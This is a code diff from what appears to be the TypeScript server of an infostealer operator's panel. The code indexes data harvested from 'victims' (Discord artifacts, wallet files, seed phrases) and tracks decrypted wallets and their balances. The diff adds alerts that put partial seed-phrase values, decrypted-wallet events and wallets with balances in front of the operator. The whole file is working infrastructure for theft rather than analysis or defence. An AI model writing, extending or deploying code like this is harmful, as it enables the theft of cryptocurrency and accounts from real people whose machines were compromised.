@@ -153,7 +153,9 @@ export async function processArtifact(artifactId: string): Promise<void> {
     try {
       await processDiscordArtifact(artifact);
     } catch (error) {
-      await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'failed', error: (error instanceof Error ? error.message : 'discord_failed').slice(0, 500) } });
+      const message = (error instanceof Error ? error.message : 'discord_failed').slice(0, 500);
+      await prisma.artifact.update({ where: { id: artifact.id }, data: { status: 'failed', error: message } });
+      await recordArtifactFailure(artifact.victimId, artifact.id, message);
     }
     return;
   }
@@ -219,10 +221,45 @@ export async function processArtifact(artifactId: string): Promise<void> {
       where: { id: artifactId },
       data: { status: 'failed', error: message.slice(0, 500) }
     });
-    await prisma.event.create({
-      data: { victimId: artifact.victimId, kind: 'artifact_failed', data: { artifactId, error: message } }
-    });
+    await recordArtifactFailure(artifact.victimId, artifactId, message);
   }
+}
+
+async function seedNotification(victimId: string, value: string, path: string): Promise<void> {
+  await notify({
+    kind: 'seed',
+    victimId,
+    title: 'Seed found',
+    body: `${path || 'seed'} · ${String(value).slice(0, 120)}`,
+    link: `/victims/${victimId}`,
+    dedupeKey: `seed:${victimId}:${createHash('sha256').update(String(value)).digest('hex')}`
+  }).catch(() => undefined);
+}
+
+async function walletNotification(victimId: string, target: string, path: string, reason: string): Promise<void> {
+  await notify({
+    kind: reason.startsWith('balance') ? 'wallet_balance' : 'wallet_decrypted',
+    victimId,
+    title: reason.startsWith('balance') ? 'Wallet with balance' : 'Wallet decrypted',
+    body: `${target} · ${reason} · ${path}`,
+    link: `/victims/${victimId}`,
+    dedupeKey: `wallet:${victimId}:${target}:${reason.startsWith('balance') ? reason : 'decrypted'}`
+  }).catch(() => undefined);
+}
+
+async function recordArtifactFailure(victimId: string, artifactId: string, message: string): Promise<void> {
+  await prisma.event.create({
+    data: { victimId, kind: 'artifact_failed', data: { artifactId, error: message } }
+  }).catch(() => undefined);
+  await notify({
+    kind: 'artifact_failed',
+    victimId,
+    title: 'Artifact failed',
+    body: message.slice(0, 300),
+    link: `/victims/${victimId}`,
+    dedupeKey: `artifact_failed:${artifactId}:${message.slice(0, 120)}`,
+    dedupeMs: 30 * 60_000
+  }).catch(() => undefined);
 }
 
 async function readLine(fd: Awaited<ReturnType<typeof open>>, at: number): Promise<{ text: string; bytes: number }> {
@@ -350,6 +387,7 @@ async function indexHarvest(victimId: string, artifactId: string, paths: string[
       update: { artifactId, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest', decryptState: decrypted ? 'done' : 'none' },
       create: { victimId, artifactId, kind: 'desktop', targetId: id, path: walletPath, state: decrypted ? 'decrypted' : 'locked', reason: 'discord_harvest' }
     });
+    if (decrypted) await walletNotification(victimId, id, walletPath, 'decrypted');
   }
   for (const path of paths) {
     if (path.endsWith('findings.txt') || path.includes('findings-')) {
@@ -370,9 +408,12 @@ async function indexWalletJson(victimId: string, artifactId: string, path: strin
         update: { artifactId, kind: wallet.kind, targetId: wallet.id, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null },
         create: { victimId, artifactId, kind: wallet.kind, targetId: wallet.id, path: wallet.path, state: wallet.state as never, reason: wallet.reason ?? 'discord_scan', address: wallet.address ?? null, balance: wallet.balance ?? null }
       });
+      if (wallet.state === 'decrypted') await walletNotification(victimId, wallet.id, wallet.path, 'decrypted');
+      if (wallet.balance && wallet.balance !== '0') await walletNotification(victimId, wallet.id, wallet.path, `balance ${wallet.balance}`);
     }
     for (const seed of parsed.seeds ?? []) {
       await prisma.event.create({ data: { victimId, kind: 'seed_found', data: { type: seed.kind, value: seed.value, words: seed.words ?? 0, path: seed.path, source: 'discord_scan' } } });
+      await seedNotification(victimId, seed.value, seed.path);
     }
   } catch {
     // malformed index still remains in Files
@@ -433,16 +474,17 @@ async function indexArtifact(artifactId: string, victimId: string, manifest: Man
           await prisma.event.create({
             data: { victimId, kind: 'wallet_decrypted', data: { path: wallet.path, target: wallet.id } }
           });
+          await walletNotification(victimId, wallet.id, wallet.path, 'decrypted');
         }
         if (wallet.balance && wallet.balance !== '0') {
-          await notify({ kind: 'wallet_balance', victimId, title: 'Wallet with balance', body: `${wallet.id} → ${wallet.balance}` });
+          await walletNotification(victimId, wallet.id, wallet.path, `balance ${wallet.balance}`);
         }
       }
       for (const seed of parsed.seeds ?? []) {
         await prisma.event.create({
           data: { victimId, kind: 'seed_found', data: { path: seed.path, type: seed.kind, words: seed.words ?? 0, value: seed.value } }
         });
-        await notify({ kind: 'seed', victimId, title: 'Seed decrypted', body: `${seed.kind} · ${seed.path}` });
+        await seedNotification(victimId, seed.value, seed.path);
       }
     } catch {
       // wallets.json is optional for other wallet modules
